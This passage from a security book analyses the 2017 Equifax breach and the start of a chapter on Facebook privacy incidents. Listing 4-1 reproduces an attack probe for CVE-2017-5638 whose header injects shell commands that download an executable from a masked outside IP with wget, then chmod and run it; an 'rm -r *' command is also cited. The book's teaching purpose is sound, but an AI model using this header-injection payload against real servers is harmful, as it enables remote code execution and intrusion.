use at Equifax as well as tens of thousands of   organizations. Most organizations these days use third-party software  components in addition to developing software of their own. Open source  software is a large category of third-party software. It enables developers  to create and release products faster by reusing components developed  by the open source community. Equifax cannot be faulted for using such  third-party open source projects, but it can be faulted for not keeping up to  date with the latest security patches for its third-party software.  Due to many organizations having a reliance on third-party software    often dozens or hundreds of such third-party software packages ,  information security teams often have a sub-team that is responsible for  managing risk due to third-party software. Such teams advise organizations  about security vulnerabilities in their third-party software supply chain and  support IT teams in identifying vulnerabilities, applying security patches,  and or mitigating the risk posed by software vulnerabilities in the case that  patches cannot be applied. Equifax had such a sub-team dubbed the Global  Threat and Vulnerability Management  GTVM  team.  As software can have many vulnerabilities, such threat and vulnerability   management teams often use many software tools to help them in their  jobs. One such key tool is a vulnerability scanner. A vulnerability scanner  attempts to probe every piece of software that is present and running on a  network for known vulnerabilities  rather than zero-day vulnerabilities .  Although vulnerability scanners have been around for more than two  decades, strictly relying on a vulnerability scanner is typically not sufficient  to help threat and vulnerability management teams. Vulnerability scanners  provide the raw data on potentially open vulnerabilities in the systems  being scanned. In addition to such raw data from one  or more  vulnerability  scanners, systems and processes are needed to not only identify  vulnerabilities but rate them for level of risk, assign them to employees for  remediation, track them, technically verify that they have been resolved  once they have  supposedly  been patched or fixed, and escalate them to  management if vulnerabilities are not getting resolved fast enough.  79   ChAPTEr 4    ThE EquIFAx BrEACh  With regard to some industry-level challenges, even though   vulnerability scanners have been around for a very long time, gaps still  remain. For instance, there is no one vulnerability scanner that can  detect every possible known vulnerability. Even when vulnerabilities  are known, companies that develop vulnerability scanners typically also  need to develop a test for each vulnerability. Such tests are not 100%  accurate and can result in either false positives  in which case there is  really no vulnerability, but the vulnerability scanner reports that there is   or false negatives  in which there really does exist a vulnerability, but the  vulnerability scanner reports that there is not .   End-of-Life McAfee Vulnerability Scanner  In Equifax’s case, after the GTVM team had emailed over 400 employees  about a particularly dangerous vulnerability  CVE-2017-5638 , they  then went about scanning for presence of the vulnerability in Equifax’s  networks. The Equifax team used the McAfee Vulnerability Manager to  help them in identifying such vulnerabilities. The McAfee Vulnerability  Manager was announced to be “end-of-life” in October 2015 and was  going to be supported by McAfee until January 2018 at the latest. Once  a product is announced to be “end-of-life,” the company that develops  the product does not invest in new features and functionality, but rather  only continues to provide maintenance and basic updates. Behind the  scenes, engineers and product teams that were working on an end-of- life project transition to other projects and focus on newer products  or improving current products that the vendor plans to continue to  support. For those of us in the software industry, we know that once  products are end-of-life, one can expect that the products can become  stale, as they may not receive further investment. McAfee, to their  credit, announced that they would help transition their customers over  to Rapid7’s vulnerability scanner, Nexpose. Equifax was unfortunately   80   ChAPTEr 4    ThE EquIFAx BrEACh  still actively using and relying on the McAfee Vulnerability Manager  in March 2017, and its continued use was indicative of maintenance,  technical debt, and legacy systems issues in Equifax’s security posture.   Apache Struts Vulnerabilities  Apache Struts has had a history of critical security vulnerabilities that  allows attackers to exploit it and use it to run commands  execute code   of their choice. Apache Struts had over 60 vulnerabilities in the 12-year  period prior to Equifax’s breach, several of which allowed for arbitrary  remote code execution. When “white hat” security researchers identify  new software security vulnerabilities, they often report them to the  developer of the software so that a fix or a patch for the vulnerability can  be developed. Software vulnerabilities also get reported to the National  Vulnerability Database  NVD  and are assigned a Common Vulnerability  Enumeration  CVE  identifier as well as a severity score.  “Black hats”  often find, stockpile, and sell vulnerabilities to cybercriminal groups and  nation-states.   The existence of the Apache Struts vulnerability that was used in   the Equifax breach was announced together with a patch by the Apache  Software Foundation on March 7, 2017. On March 8, the Equifax GTVM  team disseminated US-CERT  United States Computer Emergency  Readiness Team  emails requesting that relevant Equifax employees  apply the patch within 48 hours. Unfortunately, the developer who was  responsible for Equifax’s vulnerable Struts server was not on the email list.  The developer’s manager was on the email list, but did not forward the  message.  The vulnerability was given the identifier CVE-2017-5638. The CVE   identifier denoted that the vulnerability was the 5638th vulnerability  cataloged in 2017.  Note that there was a total of 14,714 vulnerabilities  cataloged in 2017 in all.  The severity for the vulnerability was a 10 out of  10  most critical , as per the Common Vulnerability Scoring System, an   81   ChAPTEr 4    ThE EquIFAx BrEACh  open standard used to rate the severity of vulnerabilities. The reason the  vulnerability was rated so high was because it let anyone anywhere else in  the world issue any command to the server that they wanted, and the server  would happily attempt to execute it.  The vulnerability was published to the NVD on March 10, 2017,   the same day that there was evidence that attackers started testing for  exploitability of the vulnerability on the Equifax network.  Just because  a vulnerability exists does not mean that it can be leveraged in an attack.  IT and security teams can often use tools such as firewalls of various  kinds to block an attacker from exploiting a vulnerability even if it exists.  Unfortunately, there was not a web application firewall or other defense  in Equifax’s network that would have prevented attackers from exploiting  CVE-2017-5638.    How CVE-2017-5638 Worked In Neil’s Foundations of Security2 book published in 2007, he had explained  the basics of how web browsers communicate with web servers and what  can go wrong if there is a security bug in the server. We will provide a  similar explanation here but focus on the specifics of the CVE-2017-5638  security bug. When a web browser connects to a web server and the low-  level connection has been established, the message that a browser then  sends to the server might look something like that shown in Figure 4-1.   cid:39  cid:28  cid:100  cid:3  cid:876  cid:349  cid:374  cid:282  cid:286  cid:454  cid:856  cid:346  cid:410  cid:373  cid:367  cid:3  cid:44  cid:100  cid:100  cid:87  cid:876  cid:1005  cid:856  cid:1005  cid:3    cid:17  cid:396  cid:381  cid:449  cid:400  cid:286  cid:396    cid:94  cid:286  cid:396  cid:448  cid:286  cid:396   Figure 4-1.  How a web browser communicates with a server  2 Neil Daswani, Christoph Kern, and Anita Kesavan, Foundations of Security   Apress, 2007 .  82   ChAPTEr 4    ThE EquIFAx BrEACh  The preceding message has been simplified for purposes of easy   explanation and is the browser’s request to “get”  GET  the “home page”  from the index.html file in the root  “ ”  directory from the web server.  The last word in the message  “HTTP 1.1”  specifies to the server what  version of the Hypertext Transfer Protocol the browser is using so that the  server can interpret the message. Of course, real communications between  web browsers contain much more information in their requests to web  servers, but the basics are mentioned in Figure 4-1. In addition to sending  a command such as the preceding GET command to a web server, a web  browser may also send over what are typically called “headers” as a part of  the request to provide more detail as to what information is requested and  what type of content  text, images, video  the browser is capable of receiving.  To exploit CVE-2017-5638, malicious requests emanating from China   sent to honeypots on the Internet were first seen on March 7, 2017, by  security researchers at Rapid7.  Honeypots are fake virtual systems spread  across the globe that security researchers monitor for malicious hacking  attempts to gather intelligence about them.  The requests were roughly of  the form shown in Listing 4-1.  Listing 4-1.  Chinese attack probe for CVE-2017-5638  GET  index.aciton HTTP 1.1 Content-type: cmd="cd  dev shm; wget http:  XXX.XXX.XXX.92:92  lmydess; chmod 777 lmydess; . lmydess;"  The first line of the message is similar to the GET request in our   simple example. Note that the filename requested  “ index.aciton”  was  misspelled, which is somewhat indicative of the fact that the requester had  no actual interest in accessing real information. For technical readers, you  will note that a “Content-type” header was sent with a GET request, which  is unusual. Although “Accept” headers are used in GET requests to specify  what types of content the requester will accept in response to a query for  information from the server, a Content-type header is typically used in   83   ChAPTEr 4    ThE EquIFAx BrEACh  POST or PUT requests to specify what type of content a browser client is  sending to a server. The attacker is taking advantage of sending input to the  server that an Apache Struts programmer may not have expected, tickling  a “corner case” in the server that is not properly handled. Such is the case  with many security bugs that attackers exploit.  In the Content-type header, the attacker also does not specify a data   type  such as text plain, text html, image, or application xml , but rather  includes a command in a part of the message in which data is expected.  Unfortunately, due to CVE-2017-5638, as is the case in many security bugs,  information that is in a part of the message that should only be interpreted  as inert data is interpreted as a command. Even more unfortunately, the  command is sent unauthenticated, and could be coming from any random  party anywhere on the Internet, yet is executed and run by the server,  irrespective of how dangerous it might be. If the web server was running  with appropriate privileges, and the command “rm -r *” was sent, the web  server would then remove  “rm”  all the files  “*”  in the directory that the  web server was running and does so recursively  “-r”  to all subdirectories  as well.  In the request shown in Listing 4-1, there are actually four commands,  separated by semicolons, which get executed in order. The first command   “cd  dev shm”  changes the current directory in which the web server  is running to “ dev shm” which is a virtual shared memory device. The  attacker is gearing up to download a malicious file but does not want to  write the file to the server’s actual disk in an attempt to escape detection.  The next command  “wget http:  XXX.XXX.XXX.92:92 lmydess”   downloads a malicious file  “lmydess”  from a Chinese website  the actual  IP address has been masked with Xs . The next command  “chmod 777  lmydess”  turns the inert file that is downloaded into a running program  that can be executed by anyone on the system, such that the attacker can  take the last step in running the command  “. lmydess”  irrespective of  what user the web server is running as and what privileges the web server  does or does not have.  84   ChAPTEr 4    ThE EquIFAx BrEACh  Additional probes were sent on March 8 from elsewhere in China, with  more malicious commands that would stop firewalls that were running, as  well as download and run additional malicious files. One might wonder  why running a command that should stop firewalls should actually work!  It turns out that one common security mistake  which is also covered in  Chapters 2 and 3 of Neil’s Foundations of Security book  is that web servers  are unfortunately often run with administrative privileges when they really  should not. Typically, only administrators have the privilege to start and  stop firewalls. A web server does not really need that privilege, but if a web  server is given that privilege and an attacker can leverage a remote code  execution vulnerability such as CVE-2017-5638, the server’s operating  system will happily oblige and stop the firewalls from running if that is the  command that the web server gets duped into executing.  In security, one well-known principle that should be followed is the  principle of least privilege, which states that any user or program should  be given only the minimal amount of privileges to do its job. Hence, a best  practice is to have web servers and other programs run under “service  accounts” with limited privileges, as mentioned in the previous chapter on  the Marriott breach, instead of under administrative account. As such, if  and when an attacker can leverage a vulnerability such as CVE-2017- 5638,  the attacker would not be able to shut down firewalls and run any  command as desired because the compromised web server does not have  the privileges to do so. Of course, the attacker would still be able to execute  any command that the web server does have the privilege to execute,  but hopefully that set can be designed to be a much smaller set than the  omnipotent set of commands that an administrator is allowed to run.  In any case, we have covered how the initial attacker probes worked    in the days following the release of the CVE-2017-5638 vulnerability.  Chinese attackers, although not exactly the same set of Chinese attackers  who would later conduct the mega-breach, learned of Equifax’s  susceptibility to the vulnerability within days of the release of the  vulnerability. Equifax’s GTVM team had disseminated emails requesting   85   ChAPTEr 4    ThE EquIFAx BrEACh  employees to patch within 48 hours. On March 15, Equifax’s GTVM team  would conduct vulnerability scans to determine if any systems were  vulnerable.  Unfortunately, the scans had false negatives. Although the vulnerability   was still present, the scans did not find the open vulnerabilities. The key  reason was that the vulnerability scans checked the root directories of  various servers for the vulnerability, but the vulnerability was present in  subdirectories. Although Equifax could have had a better system in place  for tracking who in the organization was running Apache Struts, and  following up with them to determine whether or not they had actually  patched the vulnerability, the Equifax GTVM team would have likely  thought that the vulnerability was addressed due to the false negative even  though the system owners may not have patched the vulnerability.  To an extent, the tests that are used by vulnerability scanners are  similar vaguely in concept to signatures used in anti-virus software to  detect computer viruses. However, the overlap in viruses detected by anti-  virus software is much, much higher than the overlap in vulnerabilities  detected by different vulnerability scanners. In addition, developing tests  used by the vulnerability scanners also have many challenges, as scanning  for all possible cases, permutations, and locations of the vulnerabilities  can be challenging. As such, many organizations use multiple distinct  vulnerability scanners in parallel in an attempt to detect the superset of  potential vulnerabilities, instead of the subset that can be detected by a  single scanner.  What Equifax’s GTVM team could have potentially done differently was   to first scan all their systems for the vulnerability just prior to  if the scan  could be completed quickly enough  disseminating the patching request  emails. The team would have seen that the vulnerability scanner reported  no open vulnerabilities due to CVE-2017- 5638, which would have been  an indication that something was wrong as they probably knew they were  running Apache Struts, and any security practitioner who has been doing  vulnerability management for some time knows that it is highly unlikely   86   ChAPTEr 4    ThE EquIFAx BrEACh  that IT teams would have been able to patch that quickly. They would have  realized that their vulnerability scanner was blind as to whether or not the  vulnerability was actually present and could have potentially tuned the scans  to look for the vulnerability in Apache Struts subdirectories that they knew  should probably be vulnerable. Once the scans were tuned to not be blind  to the vulnerability, the GTVM team could have then regularly scanned to  determine whether patching was getting completed and could have escalated  further to the relevant management chains after the vulnerability was  announced to the world but before the mega-breach exploitation occurred,  which was actually two whole months later.   Mega-Breach Detection After Equifax’s GTVM team distributed patch request emails on March 9  and conducted vulnerability scans that did not report existence of the  vulnerability on March 15, it was not until July 2017 that the breach would  be detected. As such, there was an unusually large gap in time where the  vulnerability was exposed to any attacker on the Internet who wanted to  probe it. Attackers are generally employing automation in scanning a large  part of the Internet for such vulnerabilities, and the open vulnerability  offered an ample opportunity to compromise Equifax.  A very detailed forensic analysis conducted by well-known forensics   firm Mandiant after the breach had revealed that although Chinese  attackers had probed Equifax’s Apache Struts server on March 10, a  potentially different set of Chinese attackers had not only exploited the  vulnerability again on May 13 but this time persistently infiltrated Equifax’s  systems.  On May 13, the attackers used CVE-2017-5638 to plant a “web shell”   or, in other words, a backdoor onto Equifax’s systems. In a manner similar  to the simple exploitation probe we described earlier, the attackers  sent a request to the Equifax Apache Struts web server with a header   87   ChAPTEr 4    ThE EquIFAx BrEACh  that contained a malicious command that downloaded a backdoor,  permanently installed it on the server to establish a foothold, and  systematically used the backdoor to further probe and start querying  Equifax’s databases.  Equifax did not have a file integrity monitoring  FIM  system in place.   File integrity monitoring systems check for any potential unexpected  changes to files that could be made by an attacker or malware. FIM  systems such as OSSEC, Tripwire, or Qualys FIM compute checksums,  hashes, or other types of signatures for each file within scope on a baseline  of the system  clean state . Any changes from that baseline involving  changes to existing files or new files created generate alerts. As such, while  the sample probe that we explained in Listing 4-1 may not trigger an alarm  because it did not attempt to write any permanent changes to disk, the  installation of the backdoor arguably would have. However, with no file  integrity monitoring system in place, there was no alarm to trigger. Once the attacker’s foothold had been established through the   installation of the backdoor, they “owned” a production machine within  Equifax’s network. They were free to start scanning and exploring Equifax’s  network for what else they could find. What the attackers were then able  to see as they continued their exploration were the crown jewels of the  company: the company’s data stores. Specifically, they were able to access  48 databases within Equifax’s network, as there was a lack of network  segmentation. A segmented network architecture would have made it such  that even though attackers had broken into one part of Equifax’s network,  they would not have been able to  as easily  access other parts of Equifax’s  network nor the databases within them.  Once the attackers made an initial compromise and planted one web   shell, that was just the beginning. The Apache Struts vulnerability was   not the only vulnerability that was exploited, even though it might have been  the first. The attackers planted approximately 30 unique web shells   over the months that they had infiltrated Equifax’s network. One of the web  shells took the form of a Java Server Pages file that was injected into the   88   ChAPTEr 4    ThE EquIFAx BrEACh  ACIS application through SQL injection. As such, ACIS was also vulnerable  to SQL injection, another well-known and highly leveraged type of  software vulnerability  also covered in Chapter 8 of Neil’s Foundations of  Security book .  Also, even though there were databases within the network that were   accessible, one might also expect that it should not be possible to be  able to issue queries to the databases without appropriate credentials.  Unfortunately, credentials for the databases were stored unencrypted in  files that were accessible. With those credentials, attackers were able to  issue approximately 9,000 queries to many databases within Equifax’s  network, 265 of which returned consumer PII that made up the over 140  million stolen records mentioned in the introduction of this chapter.  Storage of unencrypted credentials for databases in files is a rookie security  mistake and was yet another link in the chain that made Equifax’s mega-  breach possible.  The attacker’s initial probes, compromise, foothold establishment,   pivoting from one system to another, and escalation of privileges all  went undetected during the four months from March to July 2017. A  lack of countermeasures and system maintenance came together for the  attackers.  Although not patching Apache Struts was one maintenance issue,   another maintenance issue was that Equifax was not internally updating  security certificates used by the intrusion detection systems that they  did have in place. On July 29, when Equifax happened to renew a  security certificate that was 19 months out of date that was used by a  system monitoring the ACIS network for potential intrusions, their staff  immediately started observing suspicious network traffic, which they  attempted to block. It was too late though, and the damage had already  been done. The following day on July 30, more suspicious traffic was  observed, and the CIO was briefed.  89   ChAPTEr 4    ThE EquIFAx BrEACh  The next day on July 31, the CEO was briefed. Mandiant was hired   two days after that on August 2 to conduct forensics, and the FBI was also  informed of the breach. By mid-August, Equifax created Project Sparta  as part of the breach response to set up a website so that individual  consumers could determine whether or not they were impacted by the  breach. On August 17, a senior leadership meeting was held to discuss  preliminary findings from the investigation, and Equifax’s board of  directors was briefed about a week later once Mandiant confirmed  the volume of PII that was accessed by the attackers. Equifax publicly  announced the breach on September 7 via press release.   Breach Response There were various aspects of Equifax’s response to the breach, and each  of them seemed to have significant issues. Equifax decided to offer support  to consumers themselves. They set up a dedicated website through Project  Sparta, ramping up a call center to handle inbound calls from consumers  inquiring if they were impacted and offering their own complementary  “TrustedID Premier” credit monitoring and identity theft insurance, given  their capabilities as a credit reporting agency.  Although they may have had some technical capability to offer such  services, one might argue that they were not structured to do so, as most  of their customers prior to the breach were other businesses. They did not  have as much experience in dealing directly with consumers, and certainly  not at the scale that they attempted to do so. Immediately upon launch,  there were concerns that their website was not functioning properly and  letting consumers correctly know whether or not they were impacted by  the breach. Their call center was also overwhelmed.  In addition, whenever a breach occurs, consumers may   understandably lose trust and confidence in the organization that was  breached and often do not opt in to whatever remediation services that   90   ChAPTEr 4    ThE EquIFAx BrEACh  organization decides to provide. Instead, consumers have a preference  to use an alternate remediation provider of their own choosing. In fact,  LifeLock significantly benefited due to the Equifax breach, as over 100,000  consumers signed up as customers for LifeLock within one week of the  announcement of the Equifax breach.  The team that was formed to execute on Project Sparta was told that  they were working on setting up a website for a customer that had been  breached. They were not told that it was Equifax itself that was breached.  One can imagine that, at the very least, the consumer and product  messaging would need to be masterfully crafted, and without being given  the basic knowledge that the breach was at Equifax itself, it may have   left the team that was working on Project Sparta at a basic disadvantage. At  the same time, as the breach was not public yet, Equifax’s attorneys may  potentially have had concerns with letting too many employees in on the  news, as it could potentially get leaked early, leading to an even bigger  disaster, or employees could have taken inappropriate actions with the  “insider” information.  That said, in the weeks before the news of the breach was publicly   released, some Equifax executives seemed to have inappropriately acted  on the inside information about the breach. As per the Majority Staff  Report on the incident:  Equifax executives sold at least $1.8 million worth of shares  before the public disclosure of the breach. It has been reported  that its Chief Financial Officer John Gamble sold shares worth  $946,374,  its  president  of  U.S.  information  solutions,  Joseph  Loughran, exercised options to dispose of stock worth $584,099,  and its president of workforce solutions, Rodolfo Ploder, sold  $250,458 of stock on August 2, 2017.  —The Equifax Data Breach, Majority Staff Report, 115th  Congress, December 2018, US House of Representatives  Committee on Oversight and Government Reform  91   ChAPTEr 4    ThE EquIFAx BrEACh  Furthermore, the website developed by Project Sparta was not set   up as a part of Equifax’s main website at www.equifax.com. Instead, the  website was set up under the domain equifaxsecurity2017.com, which  created quite a bit of confusion, not only for consumers but even for  Equifax themselves. For consumers, after being notified about the breach,  it was unclear as to why they should trust a newly formed website with  such a long domain name that could have just as easily been registered  and set up by a phisher. In fact, as per Figure 4-2, the personnel that  operated Equifax’s own Twitter account were directing consumers to the  wrong domain—securityequifax2017.com—with the words “equifax”  and “security” reversed in the domain name.  Figure 4-2.  Equifax Twitter account directing consumers to the  wrong site  92   ChAPTEr 4    ThE EquIFAx BrEACh  The securityequifax2017.com domain was registered and set up as   an impostor website by a security researcher that wanted to make a point.  As per Figure 4-3, upon entering one’s last name, last six digits of SSN, and  zip code, the site informs you that “you just got bamboozled! This isn’t  a secure site! Tweet to @equifax to get them to change it to equifax.com  before thousands of people lose their info to phishing sites!”  Figure 4-3.  Security researcher site at securityequifax2017.com  domain  After the initial public announcement of the breach on September 7,   2017, stating that the impact was to approximately 143 million consumers,  the number of records breached was increased by 2.5 million to 145.5  million on October 2, 2017, and then further increased an additional 2.4  million to approximately 148 million on March 1, 2018. Although the  forensics involved in such investigations can be complicated, especially  at the speed at which such investigations need to take place, each  such increase in the number of records breached can leave consumers  wondering “Are there more? Am I affected by the breach even though I  might not have been thus far? What else don’t they know?” By comparison,   93   ChAPTEr 4    ThE EquIFAx BrEACh  it is much more favorable to initially announce a larger estimate, as was  done in the aftermath of the Marriott breach, in which 500 million records  were initially announced, and then that estimate was revised down to 383  million upon further investigation.   Summary Although the Apache Struts vulnerability is often heavily discussed as  the primary root cause for the Equifax breach, there were a host of other  causes that also contributed to the mega-breach, as summarized as  follows.  Prior to summarizing, though, it may also be important to note how  much of an issue just a single vulnerability such as CVE-2017-5638 can  be and that there have been over 16,000 similar vulnerabilities in the  CVSS 9 to 10 severity range over the past 20 years, representing more than  13% of all of the over 122,000 software vulnerabilities cataloged to date.  Vulnerability management, as a subfield of information security, has  been around for over two decades, but one might argue that significant  advancements in that subfield are still required to make vulnerabilities  easier to manage and less dangerous.  In summary, the root causes of the Equifax breach were as follows:     Software vulnerabilities. Both arbitrary remote code  execution due to CVE-2017-5638 and SQL injection  vulnerabilities were exploited in the attack.     Failure to correctly execute on security initiatives,   including     Patch management was not executed timely   enough for CVE-2017-5638.     Emails instead of more robust ticketing and tracking   processes were used for patch management.  94   ChAPTEr 4    ThE EquIFAx BrEACh     The McAfee vulnerability scanner that was in use   was end-of-life and had false negatives.     Security certificates required for intrusion detection   systems were not being renewed on time. Had the  intrusion detection systems been operating with  up-to- date security certificates, the compromise  could have potentially been detected before  attackers were able to steal so much data.     The principle of least privilege was not being   employed for Equifax’s Struts servers.     Missing countermeasures. Important countermeasures   such as network segmentation, file integrity  monitoring, and protection for database credentials  were not in place, which allowed attackers to move  about within Equifax’s network almost unfettered.  Organizations such as Equifax that have been entrusted with hundreds  of millions of PII records have an incredible responsibility. The obligations  to protect and keep that data secure mean they must have a world-class  security program.  95   CHAPTER 5  Facebook Security  Issues and the 2016  US Presidential  Election  Mark Zuckerberg founded Facebook in 2004 to give people the power to  build community and bring the world closer together. By 2020, Facebook  grew to become the world largest social networking site with over 2.74B  billion monthly active users. Facebook’s user base accounted for more  than half of the world’s 4.5 billion Internet users, and Facebook’s annual  revenue was over $70 billion. Facebook’s users do not directly pay for the  service, and Facebook makes the majority of its revenue from advertisers  that target users with online ads. The rise of such a large online social  platform was unprecedented in human history and holds both promise  and peril.  Facebook has been an intense focus of attention in the press regarding   its impact on the US presidential election of 2016.

For those I hurt this year, I ask forgiveness  and I will try to be better. For the ways my work was used to  divide people rather than bring us together, I ask forgiveness  and I will work to do better. May we all be better in the year  ahead, and may you all be inscribed in the book of life.”  Note that unlike other chapters in the first part of this book in which we  cover data breaches, the incidents that have impacted Facebook over time  have not all been data breaches, and third parties have been a significant  root cause behind many of its security- and privacy-related incidents.  Facebook allows each of its users to have an online profile that   includes their name, age, relationship status, education, work history,  as well as other sensitive information. The site allows its users to create  online friend connections that could be used to share updates about  anything and everything, contributing to a customized news feed that  each user receives based on who they are friends with and their profile.  Each user who joins Facebook is a point in a huge social graph in which  each online friend link contributes an edge in the graph that has become a  foundation for targeted online marketing. Facebook allows advertisers to  target online ads to its users based on their user profiles and their online  activity  e.g., which news posts they “liked” .  To help achieve the growth that it did, Facebook launched the   Facebook Developer Platform in 2007. The Developer Platform allows  third parties to develop almost limitless applications that can leverage  the social network, its user’s profile data, and its user’s activity. The intent  of the platform was to harness the creativity and intelligence of many  hundreds of thousands of software developers that did not work for the  company in figuring out what applications could best help the social  network grow.  98   Chapter 5    FaCebook SeCurity iSSueS and the 2016 uS preSidential eleCtion  Facebook has suffered multiple mega-sized incidents and breaches over  the years, and its social media platform has been abused by both politicians  seeking office and government-sponsored disinformation campaigns. In  this chapter, we will focus on the third-party abuse of Facebook leading  up to the 2016 US presidential election and multiple security and privacy  incidents due to security design flaws and implementation bugs. We do not  seek to be fully comprehensive regarding each and every security or privacy  incident that Facebook has ever experienced in this chapter but focus on the  ones that we have felt have had the largest impact and are most instructive  to learn from. In particular, Table 5-1 summarizes the specific Facebook  security and privacy incidents that are covered in this chapter.  Table 5-1.

For instance, when a user rented a video from  Blockbuster Video or purchased a movie ticket on Fandango, a news feed  entry about the user’s transaction on the third-party site would be posted.  Initially, the post was done without the user’s permission, and a class  action lawsuit found that the posts were in violation of the Video Privacy  Protection Act. Facebook paid a penalty of $9.5 million, 1.2% of the $777  million that Facebook earned in 2009, and shut down Beacon.  Beacon was an early example of Facebook’s initial focus on speed-to-   market with new features where it also wrestled with privacy challenges. To  an extent, it was also an example of Mark Zuckerberg’s approach of “move  fast and break things” motto. Although his initial approach led Facebook  to capture the market and monetize in a wildly successful fashion, Beacon  was an example where the company moved fast in an early attempt to  target advertisements and share activities with friends, but broke the law,  resulting in a fairly minor speedbump from a business perspective.  Facebook’s first mega-sized security incident occurred in 2008 when  it accidentally revealed the full dates of birth of 80 million of its members  even though members may have requested that such information stay  private.1 The bug was discovered by Graham Cluley2 on a new design of  Facebook’s profile page. Figure 5-1 shows Graham’s desired privacy setting  to not show his date of birth publicly on his profile page, and Figure 5- 2  shows his date of birth shown on the publicly available new design of  his Facebook profile at the time in violation of his privacy preference.   1 www.sophos.com en-us press-office press-releases 2008 07 facebook- birthday.aspx 2 Graham Cluley was employed by security company Sophos at the time of his  discovery.  101   Chapter 5    FaCebook SeCurity iSSueS and the 2016 uS preSidential eleCtion   Graham did not use his actual date of birth on his Facebook profile so we  are not revealing any of Graham’s PII.  Graham informed Facebook about  the issue, and Facebook fixed the issue.  That said, the incident demonstrated that there was much that could   have been done better. Perhaps the new profile design or the entire site  at www.new.facebook.com should not have been made publicly available  until more testing was done. Or perhaps a more rigorous review of the  implementation of the profile page should have been done before it was  made public on the new site. In any case, the incident was another early  example of a privacy-related hiccup at the company.  Figure 5-1.  Facebook profile setting specifying birthdays should be  kept private  Figure 5-2.  Facebook profile showing birthdate irrespective of  privacy setting  102   Chapter 5    FaCebook SeCurity iSSueS and the 2016 uS preSidential eleCtion  In 2011, Facebook received a complaint from the Federal Trade   Commission regarding misrepresentation of privacy settings and was  put under a federal consent decree. Facebook came under fire because  it offered privacy settings to its users representing that their profile  data could be restricted to be shared only with friends, but third-party  application developers for Facebook’s platform were able to access the  data even though they were not “friends.” User’s profile information was  accessible to all developers who wrote Facebook apps. Facebook wanted  to attract as many developers  and users  as possible to their platform,  as they were in competition with many other social networks at the time  including MySpace, Orkut.com  from Google , hi5, imeem, and Ning,  among others. Every application that a developer built for the Facebook  platform could be a feature not available on other platforms and could  attract users. Every user who adopted a social network application on the  platform could virally attract all their friends to also use the application  and the platform. There were so many social networks at the time that  developers who wanted to build their applications once and be able to run  their application on any platform could consider using a technology called  OpenSocial. Of course, individual social networking sites had an incentive  to attract developers to their platforms and lock them into their particular  technologies.  Figure 5-3 shows a sample Facebook application that I  Neil    wrote back in 20083 to teach both the challenges and countermeasures  associated with developing social media applications as a part of Stanford’s  Advanced Computer Security Program at the time. The application allows  one to invite friends to meet at a particular date and time for coffee or  other types of events. When users added the WannaMeet application,   3 No more than a few hundred users installed WannaMeet as it was a prototype  application used to teach some of the pitfalls of computer security. Data supplied  to WannaMeet about friends was not arbitrarily stored without their permission.  103   Chapter 5    FaCebook SeCurity iSSueS and the 2016 uS preSidential eleCtion  the application was able to request a list of all friends of anyone that  installed that app  and not just the list of friends that were invited to a  particular event . For each friend, their name and picture  “pic_square”   were requested in line 5 of the WannaMeet code in Listing 5-1. Note  how easy it was for a developer to request even more data fields about  each friend—the developer just needs to add the field name to the list of  fields requested. So, if we had wanted to get all their friends’ information  including email address, gender, relationship status, and religion, it would  simply have been a matter of adding that into the list of data to retrieve.   Figure 5-3.  WannaMeet sample application from 2008  104   Chapter 5    FaCebook SeCurity iSSueS and the 2016 uS preSidential eleCtion  The full list of fields that developers were able to access about a user’s   friends is as follows:     birthday     bio     activities     Music activity     notes     online presence     news article activity     open Graph activity     books activity     Check-ins     Current city     photos     Questions     relationships     education history     relationship details     events     religion political views     Fitness activity     Status     Games activity     Subscriptions     Groups     hometown     interests     likes     Videos     Video-watch activity     Website url     Work history  Listing 5-1.

Although Facebook did expect developers to upload their privacy  policy, and instructed developers that they were not supposed to store user  data, Facebook had no easy way to verify that developers were abiding by  such instructions, and there were no technical controls that enforced the  policy. Developers could very easily store data that they requested in their  own database and would then have control over it. We will see later in this  chapter that Aleksandr Kogan, who built the “thisisyourdigitallife” app that  Cambridge Analytica acquired, did exactly that in 2014.  Even worse, if the developer stored the data and didn’t have enough   security controls around it, Facebook user data could be breached as a  result of third-party developer negligence. We will also see later in this  chapter that there have been multiple breaches of Facebook data because  application developers did not appropriately protect Facebook data that  they stored, and databases of Facebook profile data were either openly  exposed on the Internet or found their way to the dark web. Many of  Facebook’s later issues and the third-party abuse of data can be traced  back to the initial Facebook APIs  application programming interfaces .   API refers to the set of functions that Facebook allowed third-party  developers to access to build their applications.  The APIs placed much  trust in developers and were not initially designed with strong security  measures and enforcement in mind.  Facebook announced a program in July 2008 called “Verified Apps”   whose goal was to vet Facebook apps, identify the most trustworthy ones,  and highlight them to users. In addition, developers who verified their  apps would be rewarded with advertising credits and relaxed rules on how  many notifications and messages they could send to users. The program  first went into operation almost a year later in May 2009. Facebook charged  developers $375 to apply. The program was shut down in November in  2009, with the following explanation:  106   Chapter 5    FaCebook SeCurity iSSueS and the 2016 uS preSidential eleCtion  We are standardizing the idea of verification to apply to all of  the applications on Facebook Platform. We are evolving the  program  to  improve  the  overall  user  experience  and  ensure  that  applications  on  Facebook  Platform  meet  verification  standards.  We  intend  to  make  sure  that  the  experience  that  our users have on Platform is of the same quality as they expe- rience elsewhere on Facebook, which is something that we are  constantly asked for by developers.  Essentially, Facebook ideally wanted all of the applications on the   Facebook platform to be trustworthy. Unfortunately, that goal proved to be  much harder than expected.  Although the FTC did not issue a fine against Facebook in 2011,   Facebook was required by law to put a comprehensive privacy program in  place. As we will see, access to user profile data by third-party applications  on Facebook continued to be an issue for years to come.   Watering Hole Attack In February 2013, Facebook employees were compromised due to a  “watering hole” attack in which software developers working for the  company were infected by legitimate but compromised websites. The  attackers had compromised third-party websites that they knew software  developers at high-tech companies would visit. The infected websites  in the attack were mobile development reference websites  such as  iphonedevsdk.com  and were leveraged by the attackers as common sites  that software developers at multiple companies often visited for technical  information. Although no user data was stolen in the compromise of  Facebook employees, the attack was notable because it leveraged a zero-  day vulnerability in Java that allowed the attacker to bypass the browser  sandbox of visitors to the infected sites and install a malware drive-by-  download on employee machines.  107   Chapter 5    FaCebook SeCurity iSSueS and the 2016 uS preSidential eleCtion  The February 2013 attack was suspected to be conducted by the   Morpho hacking group whose goal was to conduct corporate espionage and  steal corporate secrets to sell to others for financial gain. In particular, it is  suspected that mobile operating system and application source code from  multiple companies was of interest in this specific attack in February 2013.  In addition to Facebook developers, developers from Apple, Microsoft, and  Twitter were infected as well.4 Once developer machines were infected, a  remote access Trojan could be installed to use the compromised machine  as a beachhead to scan internal corporate networks for source code, design  documents, trade secrets, credentials for other systems, and so on. The  watering hole 